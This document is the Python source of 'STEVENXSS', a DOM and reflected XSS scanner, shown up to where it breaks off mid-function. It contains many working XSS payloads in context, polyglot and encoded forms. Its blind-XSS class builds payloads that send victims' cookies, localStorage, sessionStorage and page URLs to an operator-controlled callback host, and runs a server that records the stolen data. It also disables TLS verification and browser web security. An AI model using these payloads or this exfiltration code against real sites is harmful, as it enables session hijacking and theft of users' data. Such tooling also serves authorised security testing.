#!/usr/bin/env python3
"""
STEVENXSS v1.0 - DOM XSS Scanner
Developer: STEVEN
Advanced DOM-based XSS detection with Playwright and adaptive payload engine
"""

import asyncio
import aiohttp
import argparse
import time
import urllib.parse
import random
import json
import re
import logging
import hashlib
from typing import List, Dict, Set, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import sys
import os
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from playwright.async_api import async_playwright
import html
import base64

# =============================================
# ENHANCED TERMINAL UI AND DISPLAY
# =============================================

class TerminalColors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class DisplayManager:
    """Enhanced terminal display management"""
    
    @staticmethod
    def print_banner():
        """Print professional banner"""
        banner = f"""
{TerminalColors.CYAN}{TerminalColors.BOLD}
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    ███████╗████████╗███████╗██╗   ██╗███████╗███╗   ██╗██╗  ██╗║
║    ██╔════╝╚══██╔══╝██╔════╝██║   ██║██╔════╝████╗  ██║╚██╗██╔╝║
║    ███████╗   ██║   █████╗  ██║   ██║█████╗  ██╔██╗ ██║ ╚███╔╝ ║
║    ╚════██║   ██║   ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║ ██╔██╗ ║
║    ███████║   ██║   ███████╗ ╚████╔╝ ███████╗██║ ╚████║██╔╝ ██╗║
║    ╚══════╝   ╚═╝   ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝║
║                                                                ║
║    {TerminalColors.YELLOW}🚀 WELCOME TO STEVEN WEB KIT - free EDITION{TerminalColors.CYAN}      ║
║    {TerminalColors.WHITE}Advanced DOM XSS Scanner v1.0{TerminalColors.CYAN}                          ║
║    Developer: STEVEN | Enterprise Security Tool{TerminalColors.CYAN}           ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
{TerminalColors.END}
"""
        print(banner)
    
    @staticmethod
    def print_section(title):
        """Print section header"""
        print(f"\n{TerminalColors.BLUE}{TerminalColors.BOLD}╔═{'═' * (len(title) + 2)}═╗{TerminalColors.END}")
        print(f"{TerminalColors.BLUE}{TerminalColors.BOLD}║  {title}  ║{TerminalColors.END}")
        print(f"{TerminalColors.BLUE}{TerminalColors.BOLD}╚═{'═' * (len(title) + 2)}═╝{TerminalColors.END}")
    
    @staticmethod
    def print_info(message):
        """Print info message"""
        print(f"{TerminalColors.CYAN}[ℹ] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_success(message):
        """Print success message"""
        print(f"{TerminalColors.GREEN}[✓] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_warning(message):
        """Print warning message"""
        print(f"{TerminalColors.YELLOW}[!] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_error(message):
        """Print error message"""
        print(f"{TerminalColors.RED}[✗] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_critical(message):
        """Print critical message"""
        print(f"{TerminalColors.RED}{TerminalColors.BOLD}[💀] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_progress(current, total, param, payload):
        """Print progress indicator without showing full requests"""
        percentage = (current / total) * 100
        print(f"{TerminalColors.WHITE}[{current}/{total}] {percentage:.1f}% - Testing: {param} {TerminalColors.END}", end='\r')
    
    @staticmethod
    def print_vulnerability(result):
        """Print vulnerability discovery in a formatted way"""
        level_colors = {
            "critical": TerminalColors.RED,
            "high": TerminalColors.YELLOW,
            "medium": TerminalColors.MAGENTA,
            "low": TerminalColors.BLUE
        }
        
        level_color = level_colors.get(result.level.value, TerminalColors.WHITE)
        level_icon = "💀" if result.level.value == "critical" else "⚠️" if result.level.value == "high" else "🔍" if result.level.value == "medium" else "ℹ"
        
        print(f"\n{TerminalColors.RED}{TerminalColors.BOLD}┌─── XSS VULNERABILITY DETECTED ───{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {level_icon} {level_color}{result.level.value.upper():<9}{TerminalColors.RED} {TerminalColors.CYAN}Parameter: {TerminalColors.WHITE}{result.parameter}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Context:    {TerminalColors.WHITE}{result.context.value}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Confidence: {TerminalColors.WHITE}{result.confidence:.1f}%{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Payload:    {TerminalColors.WHITE}{result.payload}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}URL:        {TerminalColors.WHITE}{result.url}{TerminalColors.END}")
        print(f"{TerminalColors.RED}└──────────────────────────────────{TerminalColors.END}")

# Configure advanced logging with enhanced format
logging.basicConfig(
    level=logging.INFO,
    format=f'{TerminalColors.WHITE}%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s{TerminalColors.END}',
    handlers=[
        logging.FileHandler('stevenxss_advanced.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('STEVENXSSv1.0')

# =============================================
# EXISTING CORE CLASSES (UNCHANGED)
# =============================================

class ScanContext(Enum):
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    DOM = "dom"
    UNKNOWN = "unknown"

class VulnerabilityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    context: ScanContext
    level: VulnerabilityLevel
    reflection_data: Dict
    dom_analysis: Optional[Dict] = None
    http_status: int = 200
    timestamp: str = ""
    confidence: float = 0.0

@dataclass
class PayloadEffectiveness:
    payload: str
    success_count: int = 0
    total_tests: int = 0
    contexts: Set[ScanContext] = None
    success_rate: float = 0.0
    
    def __post_init__(self):
        if self.contexts is None:
            self.contexts = set()
        self._update_success_rate()
    
    def _update_success_rate(self):
        if self.total_tests > 0:
            self.success_rate = (self.success_count / self.total_tests) * 100

class AsyncHTTPClient:
    def __init__(self, max_concurrency: int = 50, timeout: int = 30):
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.session = None
        self.semaphore = asyncio.Semaphore(max_concurrency)
        
    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(limit=self.max_concurrency, verify_ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def get(self, url: str, headers: Dict = None) -> tuple[int, str, Dict]:
        async with self.semaphore:
            try:
                async with self.session.get(url, headers=headers, ssl=False) as response:
                    text = await response.text()
                    return response.status, text, dict(response.headers)
            except Exception as e:
                logger.error(f"GET request failed for {url}: {e}")
                return 0, str(e), {}
    
    async def post(self, url: str, data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
        async with self.semaphore:
            try:
                async with self.session.post(url, data=data, headers=headers, ssl=False) as response:
                    text = await response.text()
                    return response.status, text, dict(response.headers)
            except Exception as e:
                logger.error(f"POST request failed for {url}: {e}")
                return 0, str(e), {}

class AdvancedDOMAnalyzer:
    def __init__(self):
        self.sources = [
            'location.href', 'location.search', 'location.hash', 'document.URL',
            'document.documentURI', 'document.referrer', 'window.name', 
            'document.baseURI', 'document.cookie', 'localStorage', 'sessionStorage',
            'location.hostname', 'location.pathname', 'performance.navigation',
            'history.state', 'document.title', 'URLSearchParams'
        ]
        self.sinks = [
            'eval', 'Function', 'setTimeout', 'setInterval', 'setImmediate',
            'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write', 
            'document.writeln', 'window.location', 'location.assign',
            'location.replace', 'document.domain', 'element.src', 'element.href',
            'element.setAttribute', 'element.innerHTML', 'element.outerHTML',
            'document.createElement', 'DOMParser.parseFromString'
        ]
    
    async def analyze_dom_environment(self, url: str) -> Dict[str, Any]:
        """Comprehensive DOM environment analysis"""
        DisplayManager.print_info("Starting DOM environment analysis...")
        dom_analysis = {
            'sources': [],
            'sinks': [],
            'event_listeners': [],
            'dynamic_scripts': [],
            'dangerous_functions': [],
            'url_manipulations': [],
            'vulnerabilities': []
        }
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=['--no-sandbox', '--disable-web-security']
                )
                context = await browser.new_context()
                page = await context.new_page()
                
                try:
                    # Enable console logging
                    page.on("console", lambda msg: logger.debug(f"CONSOLE: {msg.text}"))
                    
                    await page.goto(url, wait_until="networkidle", timeout=30000)
                    
                    # Comprehensive DOM analysis
                    analysis_result = await page.evaluate("""
                        () => {
                            const results = {
                                sources: [],
                                sinks: [],
                                eventListeners: [],
                                dynamicScripts: [],
                                dangerousFunctions: [],
                                urlManipulations: []
                            };

                            // Analyze sources
                            const sourceChecks = [
                                {name: 'location.href', value: location.href},
                                {name: 'location.search', value: location.search},
                                {name: 'location.hash', value: location.hash},
                                {name: 'document.URL', value: document.URL},
                                {name: 'document.referrer', value: document.referrer},
                                {name: 'window.name', value: window.name},
                                {name: 'document.cookie', value: document.cookie},
                                {name: 'localStorage', value: JSON.stringify(localStorage)},
                                {name: 'sessionStorage', value: JSON.stringify(sessionStorage)}
                            ];

                            sourceChecks.forEach(source => {
                                if (source.value && source.value.length > 0) {
                                    results.sources.push({
                                        type: 'source',
                                        name: source.name,
                                        value: source.value.substring(0, 200),
                                        dangerous: source.value.includes('script') || 
                                                  source.value.includes('<') || 
                                                  source.value.includes('>')
                                    });
                                }
                            });

                            // Analyze sinks and dangerous functions
                            const elements = document.querySelectorAll('*');
                            elements.forEach(element => {
                                // Check innerHTML/outerHTML
                                if (element.innerHTML && element.innerHTML.length > 0) {
                                    results.sinks.push({
                                        type: 'sink',
                                        name: 'innerHTML',
                                        element: element.tagName,
                                        value: element.innerHTML.substring(0, 100),
                                        dangerous: element.innerHTML.includes('script') ||
                                                  element.innerHTML.includes('onload') ||
                                                  element.innerHTML.includes('javascript:')
                                    });
                                }

                                // Check event listeners
                                const attributes = element.attributes;
                                for (let attr of attributes) {
                                    if (attr.name.startsWith('on') && attr.value) {
                                        results.eventListeners.push({
                                            element: element.tagName,
                                            event: attr.name,
                                            handler: attr.value.substring(0, 100),
                                            dangerous: attr.value.includes('location') || 
                                                      attr.value.includes('eval') ||
                                                      attr.value.includes('document.write')
                                        });
                                    }
                                }

                                // Check dangerous attributes
                                const dangerousAttrs = ['src', 'href', 'action', 'formaction'];
                                dangerousAttrs.forEach(attr => {
                                    const value = element.getAttribute(attr);
                                    if (value && (value.includes('javascript:') || 
                                                 value.includes('data:') || 
                                                 value.includes('vbscript:'))) {
                                        results.sinks.push({
                                            type: 'sink',
                                            name: attr,
                                            element: element.tagName,
                                            value: value,
                                            dangerous: true
                                        });
                                    }
                                });
                            });

                            // Check for dynamic script creation
                            if (document.createElement) {
                                try {
                                    const testScript = document.createElement('script');
                                    results.dynamicScripts.push({
                                        type: 'dynamic_script',
                                        method: 'createElement',
                                        available: true
                                    });
                                } catch (e) {}
                            }

                            // Check for URL manipulations
                            if (window.history && window.history.pushState) {
                                results.urlManipulations.push({
                                    type: 'url_manipulation',
                                    method: 'pushState',
                                    available: true
                                });
                            }

                            if (window.history && window.history.replaceState) {
                                results.urlManipulations.push({
                                    type: 'url_manipulation',
                                    method: 'replaceState',
                                    available: true
                                });
                            }

                            return results;
                        }
                    """)
                    
                    dom_analysis.update(analysis_result)
                    
                    # Test DOM XSS payloads
                    DisplayManager.print_info("Testing DOM XSS payloads...")
                    dom_vulnerabilities = await self._test_dom_payloads(page, url)
                    dom_analysis['vulnerabilities'] = dom_vulnerabilities
                    
                    await browser.close()
                    
                except Exception as e:
                    logger.error(f"DOM analysis failed for {url}: {e}")
                    await browser.close()
        
        except Exception as e:
            logger.error(f"Playwright initialization failed: {e}")
        
        DisplayManager.print_success(f"DOM analysis completed - Found {len(dom_analysis['vulnerabilities'])} potential issues")
        return dom_analysis
    
    async def _test_dom_payloads(self, page, url: str) -> List[Dict]:
        """Test DOM XSS payloads in various contexts"""
        vulnerabilities = []
        dom_payloads = self._generate_dom_payloads()
        
        for payload in dom_payloads:
            try:
                # Test in hash context
                await page.goto(f"{url}#{payload}", wait_until="networkidle")
                
                # Test in various DOM contexts
                test_results = await page.evaluate("""
                    (payload) => {
                        const results = {
                            hash_execution: false,
                            eval_context: false,
                            innerHTML_context: false,
                            event_handler: false,
                            url_manipulation: false
                        };

                        try {
                            // Test hash execution
                            if (location.hash && location.hash.includes(payload)) {
                                results.hash_execution = true;
                            }

                            // Test eval context
                            try {
                                eval('var test = "' + payload + '"');
                                results.eval_context = true;
                            } catch(e) {}

                            // Test innerHTML context
                            const testDiv = document.createElement('div');
                            testDiv.innerHTML = payload;
                            if (testDiv.innerHTML.includes(payload)) {
                                results.innerHTML_context = true;
                            }

                            // Test event handler context
                            testDiv.setAttribute('onclick', payload);
                            if (testDiv.getAttribute('onclick') === payload) {
                                results.event_handler = true;
                            }

                            // Test URL manipulation
                            if (history.pushState) {
                                const originalURL = location.href;
                                history.pushState({}, '', payload);
                                results.url_manipulation = location.href.includes(payload);
                                history.pushState({}, '', originalURL);
                            }

                        } catch (e) {
                            console.error('DOM test error:', e);
                        }

                        return results;
                    }
                """, payload)
                
                # Check for successful executions
                if any(test_results.values()):
                    vulnerability = {
                        'payload': payload,
                        'type': 'DOM_XSS',
                        'context': 'dom_manipulation',
                        'test_results': test_results,
                        'confidence': self._calculate_confidence(test_results)
                    }
                    vulnerabilities.append(vulnerability)
                    DisplayManager.print_warning(f"DOM XSS potential detected: {payload}")
                
            except Exception as e:
                logger.debug(f"DOM payload test failed for {payload}: {e}")
        
        return vulnerabilities
    
    def _generate_dom_payloads(self) -> List[str]:
        """Generate DOM-specific XSS payloads"""
        return [
            "#<img src=x onerror=alert(1)>",
            "#javascript:alert(1)",
            "#'onclick=alert(1)//",
            "#\"onmouseover=alert(1)//",
            "#<script>alert(1)</script>",
            "#{alert(1)}",
            "#${alert(1)}",
            "#`${alert(1)}`",
            "#{{constructor.constructor('alert(1)')()}}",
            "#<svg onload=alert(1)>",
            "#<iframe src=javascript:alert(1)>"
        ]
    
    def _calculate_confidence(self, test_results: Dict) -> float:
        """Calculate confidence score for DOM XSS detection"""
        confidence = 0.0
        weights = {
            'eval_context': 0.3,
            'innerHTML_context': 0.25,
            'event_handler': 0.2,
            'hash_execution': 0.15,
            'url_manipulation': 0.1
        }
        
        for test, weight in weights.items():
            if test_results.get(test):
                confidence += weight
        
        return min(confidence * 100, 100.0)

class AdvancedAdaptivePayloadEngine:
    def __init__(self):
        self.payload_effectiveness: Dict[str, PayloadEffectiveness] = {}
        self.context_success_rates: Dict[ScanContext, float] = {}
        self.learning_enabled = True
    
    def generate_context_specific_payloads(self, context: ScanContext) -> List[str]:
        """Generate payloads specific to injection context"""
        base_payloads = {
            ScanContext.HTML: [
                "<script>alert(1)</script>",
                "><script>alert(1)</script>",
                "</script><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>"
            ],
            ScanContext.ATTRIBUTE: [
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)",
                " autofocus onfocus=alert(1)//",
                "x\" autofocus onfocus=alert(1) \"",
                "` onfocus=alert(1) x=\"",
                " onfocus=alert(1) autofocus"
            ],
            ScanContext.JAVASCRIPT: [
                "';alert(1);//",
                "\";alert(1);//",
                "`;alert(1);//",
                "};alert(1);//",
                "\\';alert(1);//",
                "</script><script>alert(1)</script>"
            ],
            ScanContext.URL: [
                "javascript:alert(1)",
                "javascript:alert(document.domain)",
                "JavasCript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:msgbox(1)"
            ],
            ScanContext.DOM: [
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                "#'onclick=alert(1)//",
                "#{alert(1)}",
                "#${alert(1)}"
            ]
        }
        
        return base_payloads.get(context, [])
    
    def generate_polyglot_payloads(self) -> List[str]:
        """Generate polyglot payloads that work in multiple contexts"""
        return [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1)//",
            ">><marquee><img src=x onerror=confirm(1)></marquee>",
            "javascript://%0Aalert(1)",
            "`\"'><script>\\u0061lert(1)</script>",
            "<!--<img src=\"--><img src=x onerror=alert(1)>",
            "<<script>alert(1)</script>",
            "<img/src=\"`<script>alert(1)</script>\"`",
            "\\\"\\'--></style></scRipt><scRipt>alert(1)</scRipt>"
        ]
    
    def generate_encoded_payloads(self, payload: str) -> List[str]:
        """Generate encoded variations of a payload"""
        variations = []
        
        # URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # HTML encoding
        variations.append(html.escape(payload))
        variations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        # Unicode encoding
        variations.append(''.join([f'\\u{ord(c):04x}' for c in payload]))
        variations.append(''.join([f'%u{ord(c):04x}' for c in payload]))
        
        # Double encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        variations.append(html.escape(html.escape(payload)))
        
        # Base64 encoding
        try:
            variations.append(f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}")
        except:
            pass
        
        # Mixed encoding
        mixed = payload
        mixed = mixed.replace('<', '%3C').replace('>', '%3E')
        mixed = mixed.replace('"', '%22').replace("'", '%27')
        variations.append(mixed)
        
        return variations
    
    def generate_adaptive_payloads(self, successful_contexts: Set[ScanContext] = None) -> List[str]:
        """Generate adaptive payloads based on successful patterns"""
        all_payloads = set()
        
        # Add context-specific payloads
        if successful_contexts:
            for context in successful_contexts:
                all_payloads.update(self.generate_context_specific_payloads(context))
        else:
            # Add payloads for all contexts
            for context in ScanContext:
                if context != ScanContext.UNKNOWN:
                    all_payloads.update(self.generate_context_specific_payloads(context))
        
        # Add polyglot payloads
        all_payloads.update(self.generate_polyglot_payloads())
        
        # Add encoded variations for top payloads
        top_payloads = self.get_most_effective_payloads(limit=10)
        for payload in top_payloads:
            all_payloads.update(self.generate_encoded_payloads(payload))
        
        return list(all_payloads)
    
    def update_effectiveness(self, payload: str, context: ScanContext, successful: bool):
        """Update payload effectiveness tracking"""
        if payload not in self.payload_effectiveness:
            self.payload_effectiveness[payload] = PayloadEffectiveness(payload=payload)
        
        effectiveness = self.payload_effectiveness[payload]
        effectiveness.total_tests += 1
        
        if successful:
            effectiveness.success_count += 1
            effectiveness.contexts.add(context)
        
        effectiveness._update_success_rate()
    
    def get_most_effective_payloads(self, limit: int = 20) -> List[str]:
        """Get most effective payloads based on success rate"""
        effective_payloads = sorted(
            self.payload_effectiveness.values(),
            key=lambda x: x.success_rate,
            reverse=True
        )
        return [p.payload for p in effective_payloads[:limit]]

class AdvancedReflectionAnalyzer:
    def __init__(self):
        self.context_patterns = {
            ScanContext.HTML: [
                r'<[^>]*{}(?:[^>]*)?>',
                r'>[^<]*{}[^<]*<',
                r'<[^>]*>.*{}.*</[^>]*>'
            ],
            ScanContext.ATTRIBUTE: [
                r'\w+\s*=\s*["\'][^"\']*{}[^"\']*["\']',
                r'<[^>]*\s\w+\s*=\s*["\'][^"\']*{}[^"\']*["\'][^>]*>'
            ],
            ScanContext.JAVASCRIPT: [
                r'<script[^>]*>[^<]*{}',
                r'javascript:[^"]*{}',
                r'on\w+\s*=\s*[^>]*{}',
                r'\b\w+\s*:\s*function[^{]*{}'
            ],
            ScanContext.URL: [
                r'https?://[^"\\s]*{}',
                r'[\'"]https?://[^\'"]*{}[^\'"]*[\'"]',
                r'window\.location[^;]*{}'
            ]
        }
    
    def analyze_reflection(self, response_text: str, payload: str) -> Dict[str, Any]:
        """Advanced reflection analysis with context detection"""
        analysis = {
            'exact_reflection': False,
            'partial_reflection': False,
            'contexts': [],
            'reflection_points': 0,
            'encoding_detected': False,
            'filter_attempts': False,
            'context_details': {},
            'confidence_score': 0.0
        }
        
        # Exact reflection check
        analysis['exact_reflection'] = payload in response_text
        analysis['reflection_points'] = response_text.count(payload)
        
        # Partial reflection checks
        analysis['partial_reflection'] = self._check_partial_reflection(response_text, payload)
        
        # Context detection
        analysis['contexts'] = self._detect_injection_context(response_text, payload)
        analysis['context_details'] = self._get_context_details(response_text, payload)
        
        # Security measures detection
        analysis['encoding_detected'] = self._check_encoding(response_text, payload)
        analysis['filter_attempts'] = self._check_filter_attempts(response_text, payload)
        
        # Confidence scoring
        analysis['confidence_score'] = self._calculate_confidence(analysis)
        
        return analysis
    
    def _check_partial_reflection(self, response_text: str, payload: str) -> bool:
        """Check for partial payload reflection"""
        dangerous_patterns = [
            r'<[^>]*>',  # HTML tags
            r'on\w+=',   # Event handlers
            r'javascript:',  # JavaScript protocol
            r'&lt;',     # Encoded HTML
            r'%3C'       # URL encoded <
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def _detect_injection_context(self, response_text: str, payload: str) -> List[ScanContext]:
        """Detect injection context with pattern matching"""
        contexts = set()
        
        for context, patterns in self.context_patterns.items():
            for pattern in patterns:
                escaped_payload = re.escape(payload)
                formatted_pattern = pattern.format(escaped_payload)
                if re.search(formatted_pattern, response_text, re.IGNORECASE | re.DOTALL):
                    contexts.add(context)
        
        return list(contexts) if contexts else [ScanContext.UNKNOWN]
    
    def _get_context_details(self, response_text: str, payload: str) -> Dict:
        """Get detailed context information"""
        details = {}
        
        # Find reflection positions
        positions = []
        start = 0
        while True:
            pos = response_text.find(payload, start)
            if pos == -1:
                break
            positions.append(pos)
            start = pos + 1
        
        details['positions'] = positions
        details['surrounding_text'] = []
        
        # Get surrounding context for each position
        for pos in positions[:3]:  # Limit to first 3 positions
            start = max(0, pos - 50)
            end = min(len(response_text), pos + len(payload) + 50)
            context = response_text[start:end]
            details['surrounding_text'].append({
                'position': pos,
                'context': context,
                'before': response_text[start:pos],
                'after': response_text[pos + len(payload):end]
            })
        
        return details
    
    def _check_encoding(self, response_text: str, payload: str) -> bool:
        """Check if payload is encoded in response"""
        encoded_variations = [
            html.escape(payload),
            urllib.parse.quote(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;')
        ]
        
        return any(encoded in response_text for encoded in encoded_variations)
    
    def _check_filter_attempts(self, response_text: str, payload: str) -> bool:
        """Check if filtering was attempted"""
        filter_indicators = [
            'script', 'alert', 'onerror', 'javascript', 'eval', 'expression',
            'vbscript', 'data:', '&lt;script', '%3Cscript', 'document.write'
        ]
        
        return any(indicator in response_text.lower() for indicator in filter_indicators)
    
    def _calculate_confidence(self, analysis: Dict) -> float:
        """Calculate confidence score for vulnerability"""
        confidence = 0.0
        
        if analysis['exact_reflection']:
            confidence += 40
        
        if analysis['partial_reflection']:
            confidence += 20
        
        if analysis['reflection_points'] > 1:
            confidence += 10
        
        if not analysis['encoding_detected']:
            confidence += 20
        
        if analysis['contexts'] and ScanContext.UNKNOWN not in analysis['contexts']:
            confidence += 10
        
        return min(confidence, 100.0)

class BlindXSSIntegration:
    def __init__(self, callback_domain: str = None, port: int = 8888):
        self.callback_domain = callback_domain
        self.port = port
        self.callbacks_received = []
        self.server = None
    
    def generate_blind_payloads(self) -> List[str]:
        """Generate blind XSS payloads"""
        if not self.callback_domain:
            return []
        
        payloads = []
        protocols = ['http', 'https'] if not self.callback_domain.startswith('http') else ['']
        
        for protocol in protocols:
            base_url = f"{protocol}://{self.callback_domain}" if protocol else self.callback_domain
            
            payloads.extend([
                f"""<script>fetch('{base_url}/c?'+btoa(document.cookie))</script>""",
                f"""<img src=x onerror="this.src='{base_url}/i?'+btoa(document.cookie)">""",
                f"""<script>var x=new XMLHttpRequest();x.open('GET','{base_url}/x?'+btoa(location.href),true);x.send();</script>""",
                f"""<script>navigator.sendBeacon('{base_url}/b',document.domain)</script>""",
                f"""<iframe src="{base_url}/f" onload="this.src='{base_url}/f?'+btoa(window.name)"></iframe>""",
                f"""<link rel="stylesheet" href="{base_url}/s?'+document.domain">""",
                f"""<meta http-equiv="refresh" content="0;url={base_url}/m?'+btoa(localStorage)">""",
                f"""<object data="{base_url}/o?'+btoa(sessionStorage)">""",
                f"""<embed src="{base_url}/e?'+btoa(JSON.stringify(performance.timing))">"""
            ])
        
        return payloads
    
    async def start_callback_server(self):
        """Start blind XSS callback server"""
        from aiohttp import web
        
        async def handle_callback(request):
            callback_data = {
                'timestamp': time.time(),
                'source_ip': request.remote,
                'method': request.method,
                'path': request.path,
                'headers': dict(request.headers),
                'query_params': dict(request.query),
                'cookies': dict(request.cookies)
            }
            
            # Try to get POST data
            try:
                if request.method == 'POST':
                    callback_data['post_data'] = await request.text()
            except:
                pass
            
            self.callbacks_received.append(callback_data)
            
            DisplayManager.print_success(f"Blind XSS Callback from {request.remote} - Path: {request.path}")
            
            # Return tracking pixel or empty response
            if request.path.startswith('/i'):
                # Return 1x1 transparent GIF
                gif_pixel = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
                return web.Response(body=gif_pixel, content_type='image/gif')
            else:
                return web.Response(text='OK')
        
        app = web.Application()
        
        # Add routes for different callback types
        app.router.add_get('/{path:.*}', handle_callback)
        app.router.add_post('/{path:.*}', handle_callback)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        self.server = web.TCPSite(runner, '0.0.0.0', self.port)
        await self.server.start()
        
        DisplayManager.print_success(f"Blind XSS callback server started on port {self.port}")
        DisplayManager.print_info(f"Callback URL: http://YOUR_DOMAIN:{self.port}/")
    
    async def stop_callback_server(self):
        """Stop the callback server"""
        if self.server:
            await self.server.stop()
            DisplayManager.print_info("Blind XSS callback server stopped")
    
    def get_callback_statistics(self) -> Dict:
        """Get callback statistics"""
        return {
            'total_callbacks': len(self.callbacks_received),
            'unique_ips': len(set(cb['source_ip'] for cb in self.callbacks_received)),
            'callback_types': {
                'get': len([cb for cb in self.callbacks_received if cb['method'] == 'GET']),
                'post': len([cb for cb in self.callbacks_received if cb['method'] == 'POST'])
            },
            'recent_callbacks': self.callbacks_received[-10:]  # Last 10 callbacks
        }

class STEVENXSSScanner:
    def __init__(self, max_concurrency: int = 50):
        self.max_concurrency = max_concurrency
        self.http_client = None
        self.payload_engine = AdvancedAdaptivePayloadEngine()
        self.reflection_analyzer = AdvancedReflectionAnalyzer()
        self.dom_analyzer = AdvancedDOMAnalyzer()
        self.blind_xss = None
        
        self.results: List[ScanResult] = []
        self.stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'scan_start_time': None,
            'scan_end_time': None,
            'dom_vulnerabilities': 0,
            'current_test': 0,
            'total_tests': 0
        }
        self.successful_contexts: Set[ScanContext] = set()
        
    async def initialize(self):
        self.http_client = AsyncHTTPClient(max_concurrency=self.max_concurrency)
        await self.http_client.__aenter__()
        self.stats['scan_start_time'] = time.time()
    
    async def close(self):
        if self.http_client:
            await self.http_client.__aexit__(None, None, None)
        self.stats['scan_end_time'] = time.time()
    
    def get_scan_duration(self) -> float:
        """Calculate scan duration safely"""
        if self.stats['scan_start_time'] is None:
            return 0.0
        if self.stats['scan_end_time'] is None:
            # If scan hasn't ended yet, calculate from current time
            return time.time() - self.stats['scan_start_time']
        return self.stats['scan_end_time'] - self.stats['scan_start_time']
    
    def _load_payloads(self, file_path: str) -> List[str]:
        """Load payloads from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            DisplayManager.print_error(f"Error loading payloads from {file_path}: {e}")
            return []
    
    def _extract_parameters(self, url: str, post_data: Dict = None) -> List[str]:
        """Extract parameters from URL and POST data"""
        parameters = []
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        parameters.extend(query_params.keys())
        
        if post_data:
            parameters.extend(post_data.keys())
        
        return list(set(parameters))
    
    async def _test_parameter_payload(self, url: str, param: str, payload: str, 
                                    method: str = 'GET', post_data: Dict = None, 
                                    headers: Dict = None) -> Optional[ScanResult]:
        """Test a single parameter-payload combination"""
        try:
            self.stats['total_requests'] += 1
            self.stats['current_test'] += 1
            
            # Show progress without detailed request info
            if self.stats['current_test'] % 10 == 0:  # Update every 10 tests
                DisplayManager.print_progress(
                    self.stats['current_test'], 
                    self.stats['total_tests'],
                    param,
                    payload[:50] + "..." if len(payload) > 50 else payload
                )
            
            if method.upper() == 'GET':
                status, response_text, response_headers = await self._test_get_payload(url, param, payload, headers)
            else:
                status, response_text, response_headers = await self._test_post_payload(url, param, payload, post_data, headers)
            
            # Analyze reflection
            reflection_analysis = self.reflection_analyzer.analyze_reflection(response_text, payload)
            
            # Determine vulnerability level
            vulnerability_level = self._assess_vulnerability_level(reflection_analysis)
            
            # Update payload effectiveness
            is_successful = vulnerability_level != VulnerabilityLevel.LOW
            context = reflection_analysis['contexts'][0] if reflection_analysis['contexts'] else ScanContext.UNKNOWN
            self.payload_engine.update_effectiveness(payload, context, is_successful)
            
            if is_successful:
                self.successful_contexts.add(context)
            
            result = ScanResult(
                url=url,
                parameter=param,
                payload=payload,
                context=context,
                level=vulnerability_level,
                reflection_data=reflection_analysis,
                http_status=status,
